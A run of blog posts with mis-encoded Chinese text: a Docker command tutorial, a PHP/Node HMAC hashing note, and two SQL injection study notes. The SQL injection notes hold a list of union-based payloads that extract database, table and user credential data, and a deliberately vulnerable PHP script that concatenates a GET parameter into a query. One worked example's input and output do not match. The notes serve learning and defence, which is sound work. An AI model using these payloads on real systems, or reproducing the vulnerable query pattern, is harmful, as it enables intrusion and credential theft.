ERRORSmyvm1 * virtualbox Running tcp:&#x2F;&#x2F;192.168.99.100:2376 v17.06.2-cemyvm2 - virtualbox Running tcp:&#x2F;&#x2F;192.168.99.101:2376 v17.06.2-ce éƒ¨ç½²åº”ç”¨ç¨‹åº 123$ lsdocker-compose.yml$ docker stack deploy -c docker-compose.yml getstartedlab ä¼ ç»Ÿæ–¹å¼ ä¼ ç»Ÿçš„æ–¹å¼å°±æ˜¯å°†docker-compose.ymlæ–‡ä»¶æ‹·è´åˆ°å¯¹åº”çš„ç®¡ç†å™¨ä¸­ã€‚ 1234# ä½¿ç”¨scp å‘½ä»¤å°†æ–‡ä»¶æ‹·è´åˆ° vm å®ä¾‹ä¸­$ lsdocker-compose.yml$ docker-machine scp docker-compose.yml myvm1:~ éƒ¨ç½²åº”ç”¨ç¨‹åº 12345678# è¿™é‡Œå°±å¯ä»¥éšæ„é€‰æ‹©ä½¿ç”¨ä¹‹å‰ä»‹ç»çš„æ–¹å¼ä¸€æˆ–è€…æ–¹å¼äºŒ# æ–¹å¼ä¸€$ docker-machine ssh myvm1 &quot;docker stack deploy -c docker-compose.yml getstartedlab&quot;# æ–¹å¼äºŒ$ docker-machine ssh myvm1docker@myvm1: $ docker stack deploy -c docker-compose.yml è€å¿ƒç­‰å¾…ä¸€ä¼šï¼Œå°±å¯ä»¥çœ‹åˆ°çœ‹åˆ°éƒ¨ç½²æˆåŠŸäº†ã€‚ è®¿é—®é›†ç¾¤åœ¨è®¿é—®é›†ç¾¤ä¹‹å‰ï¼Œä½ éœ€è¦çŸ¥é“ä»¥ä¸‹ä¸¤ä»¶äº‹ï¼š è®¿é—®é›†ç¾¤çš„IP åœ°å€æ˜¯VM çš„IPï¼Œä½¿ç”¨docker-machine lsæŸ¥çœ‹ æ˜¯å¦å­˜åœ¨ç«¯å£å·ï¼Œå–å†³äºä½ çš„docker-compose.ymlæ–‡ä»¶ Docker å¸¸ç”¨å‘½ä»¤å®¹å™¨çš„ç”Ÿå‘½å‘¨æœŸåˆ›å»ºä¸€ä¸ªæ–°çš„å®¹å™¨å¹¶è¿è¡Œï¼š 123456789$ docker run [OPTIONS] IMAGE [COMMAND] [ARG...]$ docker run ubuntu:15.10 &#x2F;bin&#x2F;echo &quot;Hello world&quot;# è§£é‡Šï¼šDockerä»¥ubuntu15.10é•œåƒåˆ›å»ºä¸€ä¸ªæ–°å®¹å™¨ï¼Œç„¶ååœ¨å®¹å™¨é‡Œæ‰§è¡Œ bin&#x2F;echo &quot;Hello world&quot;ï¼Œæœ€åè¾“å‡ºç»“æœã€‚å‚æ•°* -dï¼šè®©å®¹å™¨åœ¨åå°è¿è¡Œ* -pï¼šå†…éƒ¨å®¹å™¨ç»‘å®šåˆ°æŒ‡å®šçš„ä¸»æœºç«¯å£ä¸Š* -Pï¼šå†…éƒ¨å®¹å™¨ç«¯å£éšæœºæ˜ å°„åˆ°ä¸»æœºç«¯å£ä¸Š* --nameï¼šç»™å®¹å™¨å‘½åï¼Œå¦‚æœä¸åŠ --name å‚æ•°ï¼ŒDocker ä¼šè‡ªåŠ¨å‘½åã€‚ æ€æ‰ä¸€ä¸ªè¿è¡Œä¸­çš„å®¹å™¨ï¼š 12$ docker kill -s KILL mydocker# mydocker è¡¨ç¤ºContianer IDæˆ–è€…Name ç»“æŸåœæ­¢ä¸€ä¸ªè¿è¡Œä¸­çš„å®¹å™¨ï¼š 12$ docker container stop mydocker# mydocker è¡¨ç¤ºContainer IDæˆ–è€…Name æŸ¥çœ‹æ­£åœ¨è¿è¡Œçš„å®¹å™¨ï¼š 123456$ docker pså‚æ•°* -lï¼šæŸ¥è¯¢æœ€åä¸€æ¬¡åˆ›å»ºå®¹å™¨è®°å½•* --allï¼šæŸ¥è¯¢æ‰€æœ‰åˆ›å»ºå®¹å™¨è®°å½•* -aqï¼šæŸ¥è¯¢æ‰€æœ‰åˆ›å»ºå®¹å™¨çš„Container ID åœæ­¢Web åº”ç”¨å®¹å™¨ è¿™ä¸ªåªæ˜¯åœæ­¢è¯¥å®¹å™¨çš„è¿è¡Œï¼Œå¹¶æ²¡æœ‰æ€æ­» 1$ docker stop mydocker å¯åŠ¨Web åº”ç”¨å®¹å™¨ å·²ç»åœæ­¢çš„å®¹å™¨ï¼Œå¯ä»¥ä½¿ç”¨å‘½ä»¤ docker start æ¥å¯åŠ¨ã€‚ 1$ docker start mydocker ç§»é™¤Web åº”ç”¨å®¹å™¨ 123$ docker rm mydockermydocker# åˆ é™¤å®¹å™¨æ—¶ï¼Œå®¹å™¨å¿…é¡»æ˜¯åœæ­¢çŠ¶æ€ï¼Œå¦è€…ä¼šæŠ¥é”™ã€‚ é•œåƒæ“ä½œå¦‚ä½•åˆ›å»ºä¸€ä¸ªDocker é•œåƒ 1$ docker build --tag&#x3D;mydockerapp # æ³¨æ„ï¼šæ ‡ç­¾ååªèƒ½å°å†™ åˆ—å‡ºä¸‹è½½åˆ°è®¡ç®—æœºä¸­çš„é•œåƒ 12345678910$ docker image lsREPOSITORY TAG IMAGE ID CREATED SIZEhello-world latest fce289e99eb9 3 months ago 1.84kBå„ä¸ªé€‰é¡¹è¯´æ˜:* REPOSITORYï¼šè¡¨ç¤ºé•œåƒçš„ä»“åº“æº* TAGï¼šé•œåƒçš„æ ‡ç­¾* IMAGE IDï¼šé•œåƒID* CREATEDï¼šé•œåƒåˆ›å»ºæ—¶é—´* SIZEï¼šé•œåƒå¤§å° æŸ¥æ‰¾é•œåƒ 123456789$ docker search nginx NAME DESCRIPTION STARS OFFICIAL nginx Official build of Nginx. 11154 [OK]NAME:é•œåƒä»“åº“æºçš„åç§°DESCRIPTION:é•œåƒçš„æè¿°OFFICIAL:æ˜¯å¦dockerå®˜æ–¹å‘å¸ƒ è·å–ä¸€ä¸ªæ–°é•œåƒ å¦‚æœæˆ‘ä»¬å†³å®šä½¿ç”¨ä¸Šå›¾ä¸­çš„ nginx å®˜æ–¹é•œåƒï¼Œä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š 1$ docker pull nginx å®¹å™¨æ“ä½œåˆ—å‡ºä¸‹è½½åˆ°è®¡ç®—æœºä¸­çš„ container 12$ docker container lsCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES ä»“åº“æ“ä½œç™»å…¥hub.docker.com 12$ docker login # å‰ææ˜¯å…ˆæ³¨å†Œå·è´¦å· æ ‡è®°é•œåƒï¼Œä»¥ä¾¿ä¸Šä¼ è‡³ç›®æ ‡ä½ç½® 12$ docker tag mydocker aikang&#x2F;get-started:part1# æœ€åä¸Šä¼ è‡³æ‰€ç™»å…¥çš„Docker Hubä»“åº“ å°†æ ‡è®°çš„é•œåƒä¸Šä¼ åˆ°å­˜å‚¨åº“ï¼š 1$ docker push mydocker aikang&#x2F;get-started:part1 ä»è¿œç¨‹å­˜å‚¨åº“ä¸­æ‹‰å‡ºå¹¶è¿è¡Œæ˜ åƒ 1$ docker run -d -p 4000:80 aikang&#x2F;get-started:part1 æ³¨æ„ï¼šæ— è®ºåœ¨å“ªé‡Œæ‰§è¡Œdocker runï¼Œå®ƒéƒ½ä¼šæå–ä½ çš„é•œåƒï¼Œä»¥åŠPythonå’Œæ‰€æœ‰ä¾èµ–é¡¹requirements.txtï¼Œå¹¶è¿è¡Œä½ çš„ä»£ç ã€‚å®ƒä»¬éƒ½åœ¨ä¸€ä¸ªæ•´æ´çš„å°åŒ…ä¸­ä¸€èµ·æ—…è¡Œï¼Œä½ ä¸éœ€è¦åœ¨ä¸»æœºä¸Šå®‰è£…ä»»ä½•ä¸œè¥¿è®©Dockerè¿è¡Œå®ƒã€‚ æœåŠ¡æ“ä½œç¾¤é›†åˆå§‹åŒ–ï¼Œå¯ä»¥ä½¿èŠ‚ç‚¹å˜æˆç¾¤é›†ç®¡ç†å™¨ 1$ docker swarm init ä»¥æœåŠ¡è¿è¡Œ 1234$ docker stack deploy -c docker-compose.yml getstartedlabCreating network getstartedlab_webnetCreating service getstartedlab_web# éœ€è¦æœ‰ä¸€ä¸ªdocker-compose.yml æ–‡ä»¶ åˆ—å‡ºä¸åº”ç”¨ç¨‹åºå…³è”çš„æ­£åœ¨è¿è¡Œçš„æœåŠ¡ 1$ docker service ls æŸ¥çœ‹ä¸å †æ ˆç›¸å…³çš„æ‰€æœ‰æœåŠ¡ 12$ docker stack services getstartedlab# getstartedlab è¡¨ç¤ºæœåŠ¡çš„Names åˆ—å‡ºæœåŠ¡ä»»åŠ¡ 12$ docker service ps getstartedlab# getstartedlab è¡¨ç¤ºæœåŠ¡çš„Names å…³é—­æœåŠ¡ 12$ docker stack rm getstartedlab# getstartedlab è¡¨ç¤ºæœåŠ¡çš„Names æŸ¥çœ‹é›†ç¾¤ä¸­çš„èŠ‚ç‚¹ 1$ docker node ls VM äº¤äº’åˆ›å»ºä¸€ä¸ªVM å®ä¾‹ï¼ˆWinã€Macã€Linuxï¼‰ 1$ docker-machine create --driver virtualbox myvm1 ä½¿ç”¨ssh è¿æ¥VM å®ä¾‹ 1$ docker-machine ssh myvm1 æŸ¥çœ‹å…³äºèŠ‚ç‚¹çš„åŸºæœ¬ä¿¡æ¯ 1$ docker-machine env myvm1 ä½¿ç”¨scpå‘½ä»¤å°†æœ¬åœ°æ–‡ä»¶copyåˆ°VMå®ä¾‹ä¸­ 12$ docker-machine scp &lt;filename&gt; myvm1:~ # ä»å½“å‰ç›®å½•æ‹·è´åˆ°å®ä¾‹ä¸­çš„æ ¹ç›®å½•ä¸‹ åˆ é™¤æŒ‡å®šVM 1$ docker-machine rm myvm1 å°†Shell ä¸VM è¿æ¥ 1$ eval $(docker-machine env myvm1) å°†Shell ä¸VM æ–­å¼€ï¼Œä½¿ç”¨æœ¬åœ°è¿æ¥ 1$ eval $(docker-machine env -u) é›†ç¾¤æ“ä½œä»¥ä¸‹æ“ä½œå‡éœ€è¦åœ¨VM CLI ä¸­è¿è¡Œ åˆå§‹åŒ–é›†ç¾¤ 1$ docker swarm init --advertise-addr &lt;myvm1 ip&gt; å°†èŠ‚ç‚¹åŠ å…¥é›†ç¾¤ 1$ docker swarm join --token &lt;token&gt; &lt;ip&gt;:2377&quot; è®©å·¥ä½œè€…ç¦»å¼€é›†ç¾¤ 1$ docker swarm leave å¼ºåˆ¶ç¦»å¼€å¹¶å…³æ‰é›†ç¾¤ 1$ docker swarm leave -f æŸ¥çœ‹è¯¥èŠ‚ç‚¹çš„è¯¦æƒ…ä¿¡æ¯ 1$ docker node inspect &lt;node ID&gt; éƒ¨ç½²åº”ç”¨ç¨‹åº 1$ docker stack deploy -c &lt;file&gt; &lt;app&gt; æ‚é¡¹æŸ¥çœ‹Dockerç‰ˆæœ¬ï¼š 1$ docker version æ˜¾ç¤ºDockerç³»ç»Ÿä¿¡æ¯ï¼ŒåŒ…æ‹¬é•œåƒå’Œå®¹å™¨æ•°ï¼š 1$ docker info æŸ¥çœ‹Docker å®¹å™¨çš„é…ç½®å’ŒçŠ¶æ€ä¿¡æ¯ã€‚ 12$ docker inspect mydocker# è¡¨ç¤ºå®¹å™¨çš„Container ID æˆ–è€…Names æŸ¥çœ‹æŒ‡å®šå®¹å™¨æ˜ å°„åˆ°å®¿ä¸»æœºçš„ç«¯å£å·ã€‚ 123$ docker port mydocker80&#x2F;tcp -&gt; 0.0.0.0:4000# mydocker è¡¨ç¤ºè¯¥åº”ç”¨çš„Container ID æˆ–è€…Names æŸ¥çœ‹Web åº”ç”¨ç¨‹åºæ—¥å¿— 12345$ docker logs -f mydocker * Running on http:&#x2F;&#x2F;0.0.0.0:80&#x2F; (Press CTRL+C to quit)113.87.130.57 - - [01&#x2F;Apr&#x2F;2019 12:58:34] &quot;GET &#x2F; HTTP&#x2F;1.1&quot; 200 -113.87.130.57 - - [01&#x2F;Apr&#x2F;2019 12:58:35] &quot;GET &#x2F; HTTP&#x2F;1.1&quot; 200 -# mydocker è¡¨ç¤ºè¯¥åº”ç”¨çš„Container ID æˆ–è€…æ˜¯Names æŸ¥çœ‹Web åº”ç”¨ç¨‹åºå®¹å™¨çš„è¿›ç¨‹ 1234$ docker top mydocker # UID PID PPID C STIME TTY TIME CMDroot 22358 22323 0 20:58 ? 00:00:00 python app.py æ‚é¡¹å®¹å™¨æœ‰å“ªäº›ç½‘ç»œæ¨¡å¼1. Noneåœ¨è¯¥æ¨¡å¼ä¸‹å®¹å™¨æ²¡æœ‰å¯¹å¤–ç½‘ç»œï¼Œæœ¬åœ°æœºåªæœ‰ä¸€ä¸ªå›è·¯åœ°å€ 2. Containeråœ¨è¯¥æ¨¡å¼ä¸‹ï¼Œä¸å¦ä¸€ä¸ªå®¹å™¨å…±äº«ç½‘ç»œ 3. Hoståœ¨è¯¥æ¨¡å¼ä¸‹ï¼Œä¸ä¸»æœºå…±äº«ç½‘ç»œ 4. Bridgeè¯¥æ¨¡å¼ä¸ºDocker é»˜è®¤çš„ç½‘ç»œæ¨¡å¼ï¼Œåœ¨è¿™ç§æ¨¡å¼ä¸‹ï¼ŒDocker å®¹å™¨ä¸å¤–éƒ¨çš„é€šä¿¡éƒ½æ˜¯é€šè¿‡ iptable å®ç°çš„ã€‚ 5. Overlayè¯¥æ¨¡å¼ä¸ºDocker ç›®å‰åŸç”Ÿçš„è·¨ä¸»æœºå¤šå­ç½‘æ¨¡å‹ï¼Œä¸»è¦æ˜¯é€šè¿‡ vxlan æŠ€æœ¯å®ç°ã€‚ å‚è€ƒé“¾æ¥ Docker å…¥é—¨æ•™ç¨‹ - é˜®ä¸€å³°ç½‘ç»œæ—¥å¿— Docker å…¥é—¨ - æå®¢å­¦é™¢ å®‰è£…Docker ce - å®˜æ–¹æ–‡æ¡£ Docker Swarm å…¥é—¨æ•™ç¨‹ å¦‚ä½•åœ¨Ubuntu 18.4ä¸Šå®‰è£… Docker-ce å¦‚ä½•åœ¨Ubuntu 18.04ä¸Šå®‰è£…Docker Machine å¦‚ä½•åœ¨Ubuntu 18.04ä¸Šå®‰è£…VirtualBox","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"Tutorial","slug":"Linux/Tutorial","permalink":"https://www.0x2beace.com/categories/Linux/Tutorial/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Docker","slug":"Docker","permalink":"https://www.0x2beace.com/tags/Docker/"}]},{"title":"PHP ä¸­ä½¿ç”¨ hash_hmac åŠ å¯†","slug":"php-uses-hash-hmac-encryption","date":"2020-07-22T16:18:45.000Z","updated":"2020-11-12T01:26:42.165Z","comments":true,"path":"php-uses-hash-hmac-encryption/","link":"","permalink":"https://www.0x2beace.com/php-uses-hash-hmac-encryption/","excerpt":"ä»Šå¤©åšé¡¹ç›®æ—¶ï¼Œé‡åˆ°ä¸€ä¸ªé—®é¢˜ï¼Œéœ€è¦å°†ä¸€æ®µå“ˆå¸Œå€¼æŒ‰ç…§æŸç§è§„åˆ™è¿›è¡ŒåŠ å¯†ã€‚æºç æ˜¯ç”¨Nodeå†™çš„ï¼Œéœ€è¦ç¿»è¯‘æˆPHP ç‰ˆæœ¬çš„ã€‚","text":"ä»Šå¤©åšé¡¹ç›®æ—¶ï¼Œé‡åˆ°ä¸€ä¸ªé—®é¢˜ï¼Œéœ€è¦å°†ä¸€æ®µå“ˆå¸Œå€¼æŒ‰ç…§æŸç§è§„åˆ™è¿›è¡ŒåŠ å¯†ã€‚æºç æ˜¯ç”¨Nodeå†™çš„ï¼Œéœ€è¦ç¿»è¯‘æˆPHP ç‰ˆæœ¬çš„ã€‚ PHPä¸­ä½¿ç”¨ Hmac æ–¹æ³•ç”Ÿæˆå¸¦æœ‰å¯†é’¥çš„å“ˆå¸Œå€¼åœ¨Node.js ä¸­ï¼Œè¿™æ˜¯ä¸€æ®µç”¨äºç”Ÿæˆâ€œåŠ ç›â€çš„å“ˆå¸Œå€¼ã€‚ 12345678var crypto &#x3D; require(&#39;crypto&#39;);var secret &#x3D; &quot;122410&quot;var key &#x3D; &quot;key&quot;var hash &#x3D; crypto.createHmac(&#39;sha256&#39;, secret).update(key).digest(&#39;hex&#39;)console.log(hash);&#x2F;&#x2F; dcc9ddf4836d4ecb6bd12fccc983207f39cfb84c43c01932eee22357cf0567b4 å¦‚æœè¦ç¿»è¯‘æˆPHPç‰ˆæœ¬ï¼Œå…¶å®éå¸¸ç®€å•ï¼Œç›´æ¥ä½¿ç”¨PHP çš„ hash_hmacå‡½æ•°å°±å¯ä»¥äº†ã€‚ 12345&lt;?php$secret &#x3D; &quot;122410&quot;; $key &#x3D; &quot;key&quot;;echo hash_hmac(&quot;sha256&quot;, $key, $secret);&#x2F;&#x2F; dcc9ddf4836d4ecb6bd12fccc983207f39cfb84c43c01932eee22357cf0567b4 å°†å¯†é’¥è®¾ç½®æˆäºŒè¿›åˆ¶å¦‚æœéœ€è¦åŠ å¯†çš„éƒ¨åˆ†ï¼Œå¹¶ä¸æ˜¯æ™®é€šçš„å­—ç¬¦ä¸²ï¼Œè€Œæ˜¯äºŒè¿›åˆ¶å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆéœ€è¦ä½¿ç”¨packå‡½æ•°ã€‚ 1234var_dump(hash_hmac(&quot;sha1&quot;, &quot;office:fred&quot;, &quot;AA381AC5E4298C23B3B3333333333333333333&quot;));&#x2F;&#x2F; 5e50e6458b0cdc7ee534967d113a9deffe6740d0&#x2F;&#x2F; é¢„æœŸç»“æœï¼š46abe81345b1da2f1a330bba3d6254e110cd9ad8 å…ˆå°†åå…­è¿›åˆ¶å­—ç¬¦ä¸²è½¬æ¢ä¸ºäºŒè¿›åˆ¶æ•°æ®ï¼Œç„¶åå†å°†å…¶ä¼ é€’ç»™hash_hmacï¼š 123var_dump(hash_hmac(&quot;sha1&quot;, &quot;office:fred&quot;, pack(&quot;H*&quot;, &quot;AA381AC5E4298C23B3B3333333333333333333&quot;)));&#x2F;&#x2F; 46abe81345b1da2f1a330bba3d6254e110cd9ad8 Nodeä¸­ä½¿ç”¨cryptoè¿›è¡Œmd5 åŠ å¯†åœ¨PHP ä¸­ï¼Œå¦‚æœéœ€è¦è·å–æŸä¸ªå­—ç¬¦ä¸²çš„md5 åŠ å¯†ä¹‹åçš„å“ˆå¸Œå€¼ï¼Œéå¸¸ç®€å•ï¼Œç›´æ¥ä½¿ç”¨md5 å‡½æ•°å³å¯ã€‚ ä½†æ˜¯åœ¨node.js ä¸­ï¼Œå¹¶æ²¡æœ‰ä¸ºæˆ‘ä»¬ç›´æ¥æä¾›è¿™æ ·çš„å‡½æ•°ï¼Œæ‰€ä»¥éœ€è¦æ‰‹åŠ¨è°ƒç”¨crypto æ¨¡å—å»è½¬æ¢ï¼š 1234var pwd &#x3D; &quot;122410&quot;;var hash &#x3D; crypto.createHash(&#39;md5&#39;).update(pwd).digest(&#39;hex&#39;);&#x2F;&#x2F; 913975c2f972ba6bbf5ba593c68a5dc5 å‚è€ƒé“¾æ¥ å¦‚ä½•åœ¨PHPä¸­å°†hmac sha1å¯†é’¥è®¾ç½®ä¸ºåå…­è¿›åˆ¶ï¼Ÿ åœ¨çº¿è½¬æ¢å·¥å…· php hash_hmac å‡½æ•° node.js crypto æ¨¡å—","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Node","slug":"Node","permalink":"https://www.0x2beace.com/tags/Node/"},{"name":"Hash","slug":"Hash","permalink":"https://www.0x2beace.com/tags/Hash/"}]},{"title":"æ•´ç†å¸¸è§çš„ SQL æ³¨å…¥è¯­å¥","slug":"organize-common-sql-injection-statements","date":"2020-07-22T15:30:04.000Z","updated":"2020-07-22T15:31:27.367Z","comments":true,"path":"organize-common-sql-injection-statements/","link":"","permalink":"https://www.0x2beace.com/organize-common-sql-injection-statements/","excerpt":"è¿™ç¯‡ç¬”è®°çš„ç›®çš„æ˜¯æ•´ç†å„ç§ SQL æ³¨å…¥ä½¿ç”¨æ—¶çš„payloadã€‚","text":"è¿™ç¯‡ç¬”è®°çš„ç›®çš„æ˜¯æ•´ç†å„ç§ SQL æ³¨å…¥ä½¿ç”¨æ—¶çš„payloadã€‚ è¯´æ˜ï¼šä»¥ä¸‹çš„payloadséƒ½åŸºäºå•å¼•å·å­—ç¬¦å‹æ³¨å…¥ã€‚è‹¥æ˜¯æ•´å‹æ³¨å…¥åˆ™æŠŠå•å¼•å·å’Œæ³¨é‡Šç¬¦ï¼ˆâ€“+ï¼‰å»æ‰ï¼Œè‹¥æ˜¯åŒå¼•å·æ³¨å…¥åˆ™æŠŠå•å¼•å·æ¢æˆåŒå¼•å·ã€‚ ä¹Ÿå°±æ˜¯åŸºäºè¿™æ ·ä¸€ç§æƒ…å†µï¼š 1SELECT * FROM Student WHERE id &#x3D; &#39;1&#39;; Payload åˆ¤æ–­å½“å‰æ•°æ®è¡¨ä¸­æœ‰å‡ åˆ—ï¼š 1?id&#x3D;1&#39; order by æ•°å€¼ --+ æŸ¥çœ‹æ˜¾ç¤ºä½åœ¨ç¬¬å‡ åˆ—ï¼š 1?id&#x3D;-1&#39; union select 1,2,3 --+ æ³¨æ„ï¼šè¿™é‡Œéœ€è¦ä¼ é€’ä¸€ä¸ªä¸å­˜åœ¨çš„æ¡ä»¶ï¼Œæ¯”å¦‚ï¼šid=-1 æ˜¾ç¤ºå½“å‰æ•°æ®åº“ï¼ˆå‡è®¾æ˜¾ç¤ºä½ä¸­åŒ…å«ç¬¬ä¸‰ä½ï¼‰ï¼š 1?id&#x3D;-1&#39; union select 1,2,database() --+ æŸ¥çœ‹å½“å‰æ•°æ®åº“ä¸­çš„æ‰€æœ‰è¡¨ï¼š 1?id&#x3D;-1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()) --+ å‡½æ•°group_concat()æŠŠæ‰€æœ‰ç»“æœéƒ½åœ¨ä¸€è¡Œè¾“å‡º æŸ¥è¯¢æ‰€æœ‰æ•°æ®åº“ï¼š 1?id&#x3D;-1&#39; union select 1,2,(select group_concat(schema_name) from information_schema.schema) --+ æŸ¥è¯¢æŸä¸ªæ•°æ®åº“ä¸­çš„è¡¨ï¼š 1?id&#x3D;-1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39; --+ æŸ¥è¯¢æŸä¸ªè¡¨ä¸­çš„æ‰€æœ‰å­—æ®µï¼š 1?id&#x3D;-1&#39; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39; --+ æŸ¥è¯¢æŸä¸ªè¡¨ä¸­çš„å­—æ®µå†…å®¹ 1?id&#x3D;-1&#39; union select 1,2,(select group_concat(name, 0x3a, passwd) from security.users) 0x3aä¼šè¢«è½¬ä¹‰ä½å†’å·ï¼š UnionSQL UNION æ“ä½œç¬¦åˆå¹¶ä¸¤ä¸ªæˆ–å¤šä¸ª SELECT è¯­å¥çš„ç»“æœï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼šUNION å†…éƒ¨çš„æ¯ä¸ª SELECT è¯­å¥å¿…é¡»æ‹¥æœ‰ç›¸åŒæ•°é‡çš„åˆ—ã€‚ å‚è€ƒé“¾æ¥Webå®‰å…¨å­¦ä¹ ä¹‹æ•°æ®åº“æ³¨å…¥è¯­å¥çš„æ”¶é›†å’Œå­¦ä¹ ","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"},{"name":"Web å®‰å…¨","slug":"Web-å®‰å…¨","permalink":"https://www.0x2beace.com/tags/Web-%E5%AE%89%E5%85%A8/"}]},{"title":"è®¤è¯†SQL æ³¨å…¥å¸¸è§æ–¹å¼","slug":"know-common-ways-of-sql-injection","date":"2020-07-22T15:26:11.000Z","updated":"2020-07-22T15:29:48.375Z","comments":true,"path":"know-common-ways-of-sql-injection/","link":"","permalink":"https://www.0x2beace.com/know-common-ways-of-sql-injection/","excerpt":"æœ€è¿‘éœ€è¦åšä¸€ä¸ªæ£€æµ‹SQL æ³¨å…¥çš„åŠŸèƒ½ï¼Œæ— å¥ˆå‘ç°è‡ªå·±äºå¯¹SQL æ³¨å…¥ç«Ÿæœ‰ç‚¹é™Œç”Ÿï¼Œæœ¬ç€ææ¸…æ¥šåŸç†æ‰èƒ½æ›´å¥½çš„ç†è§£Bug äº§ç”Ÿçš„åŸå› ï¼Œäºæ˜¯ä¾¿æœ‰äº†è¿™ç¯‡ç¬”è®°ã€‚","text":"æœ€è¿‘éœ€è¦åšä¸€ä¸ªæ£€æµ‹SQL æ³¨å…¥çš„åŠŸèƒ½ï¼Œæ— å¥ˆå‘ç°è‡ªå·±äºå¯¹SQL æ³¨å…¥ç«Ÿæœ‰ç‚¹é™Œç”Ÿï¼Œæœ¬ç€ææ¸…æ¥šåŸç†æ‰èƒ½æ›´å¥½çš„ç†è§£Bug äº§ç”Ÿçš„åŸå› ï¼Œäºæ˜¯ä¾¿æœ‰äº†è¿™ç¯‡ç¬”è®°ã€‚ SQL æ³¨å…¥æ˜¯ä»€ä¹ˆï¼ŸSQL æ³¨å…¥æ˜¯ä¸€ç§å°†SQL è¯­å¥æ·»åŠ åˆ°REQUEST å‚æ•°ä¸­ï¼Œä¼ é€’åˆ°æœåŠ¡å™¨å¹¶æ‰§è¡Œçš„ä¸€ç§æ”»å‡»æ‰‹æ®µã€‚ SQL æ³¨å…¥æ”»å‡»æ˜¯REQUEST å¼•æ•¸æœªç»è¿‡è¿‡æ»¤ï¼Œç„¶åç›´æ¥æ‹¼æ¥åˆ°SQL è¯­å¥ä¸­ï¼Œè§£æå¹¶æ‰§è¡Œï¼Œè€Œè¾¾åˆ°é¢„æƒ³ä¹‹å¤–çš„ä¸€ç§è¡Œä¸ºã€‚ SQL æ³¨å…¥æ˜¯æ€æ ·äº§ç”Ÿçš„ WEB å¼€å‘äººå‘˜æ— æ³•ä¿è¯æ‰€æœ‰çš„è¾“å…¥éƒ½å·²ç»å®Œç¾è¿‡æ»¤ã€‚ æ•°æ®åº“æœªåšå®‰å…¨é…ç½®ï¼Œå­˜åœ¨å®‰å…¨éšæ‚£ã€‚ å¦‚ä½•è¿›è¡ŒSQL æ³¨å…¥è¿™é‡Œä»¥PHPã€Mysqlä¸ºä¾‹ï¼Œä»‹ç»ä¸€ä¸‹å®Œæ•´çš„SQL æ³¨å…¥æ”»å‡»æ˜¯å¦‚ä½•äº§ç”Ÿçš„ã€‚ å›æ˜¾æ³¨å…¥1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?php$db_host &#x3D; &quot;localhost&quot;;$db_user &#x3D; &quot;root&quot;;$db_pwd &#x3D; xxxxxx;$db_name &#x3D; &quot;User&quot;;$db_table &#x3D; &quot;Student&quot;;echo &#39;&lt;h1&gt;&#39;;echo &#39;Test ErrorBased Injections&#39;;echo &#39;&lt;&#x2F;h1&gt;&#39;;error_reporting(E_ALL ^ E_DEPRECATED);&#x2F;&#x2F; æµ‹è¯•è¿æ¥$conn &#x3D; mysqli_connect($db_host, $db_user, $db_pwd);if (!$conn)&#123; echo &#39;Mysql è¿æ¥å¤±è´¥:&#39;.mysqli_error($conn);&#125;else &#123; echo &#39;Mysql è¿æ¥æˆåŠŸ&#39;;&#125;echo &#39;&lt;hr&gt;&#39;;&#x2F;&#x2F;è¿æ¥æ•°æ®åº“mysqli_select_db($conn, $db_name) or die (&quot;æ— æ³•è¿æ¥åˆ°æ•°æ®åº“: &quot;.$db_name);mysqli_query($conn, &#39;set names utf-8&#39;);&#x2F;&#x2F; è·å–å‚æ•°if(isset($_GET[&#39;id&#39;]))&#123; $id&#x3D;$_GET[&#39;id&#39;];&#125;&#x2F;&#x2F; æ‹¼æ¥SQLè¯­å¥$sql&#x3D; &quot;SELECT * FROM $db_table WHERE id &#x3D; &#123;$id&#125; &quot;;echo &#39;æŸ¥è¯¢SQL è¯­å¥:&#39;.$sql;echo &#39;&lt;hr&gt;&#39;;&#x2F;&#x2F;æ‰§è¡Œ$result&#x3D;mysqli_query($conn, $sql);$row&#x3D;mysqli_fetch_array($result, MYSQLI_BOTH);if($row) &#123; echo &#39;Your Login name:&#39;.$row[&#39;username&#39;]; echo &#39;&lt;hr&gt;&#39;; echo &#39;Your Password:&#39;.$row[&#39;password&#39;];&#125;?&gt; è°ƒç”¨åœ°å€æ˜¯http://127.0.0.1/sqli.php?id=1ï¼Œä½¿ç”¨GETä¼ å…¥å‚æ•°idï¼Œè¾“å‡ºçš„SQL è¯­å¥å¦‚ä¸‹ï¼š 1SELECT * FROM Student WHERE id &#x3D; &#39;1&#39; æ­£å¸¸æƒ…å†µä¸‹ï¼Œä¼šè¿”å›id = 1 çš„å­¦ç”Ÿä¿¡æ¯ã€‚ 1. æ•°å­—æ³¨å…¥å¦‚æœåœ¨æµè§ˆå™¨ä¸­è¾“å…¥ï¼šhttp://127.0.0./sqli.php?id=1&#39; union select 1,2--+ä¼šæ€æ ·å‘¢ï¼Ÿè¾“å‡ºçš„SQL è¯­å¥å¦‚ä¸‹ï¼š 1SELECT * FROM Student WHERE id &#x3D; -1 or 1&#x3D;1 è¿™ä¼šå¯¼è‡´æ‰€æœ‰çš„å­¦ç”Ÿä¿¡æ¯éƒ½è¢«è¾“å‡ºäº†ï¼Œä¸ºä»€ä¹ˆä¼šè¿™æ ·å‘¢ï¼Ÿè¿™æ˜¯å› ä¸ºid = -1æ˜¯ä¸€ä¸ªä¸å­˜åœ¨çš„æ¡ä»¶ï¼Œè€Œ1 = 